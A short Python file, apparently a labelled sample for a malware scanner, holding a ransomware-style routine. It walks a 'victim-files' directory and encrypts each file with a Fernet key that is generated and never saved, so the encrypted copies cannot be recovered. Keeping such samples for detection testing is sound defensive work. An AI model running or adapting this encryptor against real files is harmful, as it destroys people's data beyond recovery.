# Inert source control: scanned, never imported or executed.
import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()
cipher = Fernet(key)
for root, dirs, files in os.walk("victim-files"):
    for file in files:
        path = os.path.join(root, file)
        with open(path) as handle:
            data = handle.read().encode()
        with open(file, "wb") as handle:
            handle.write(cipher.encrypt(data))
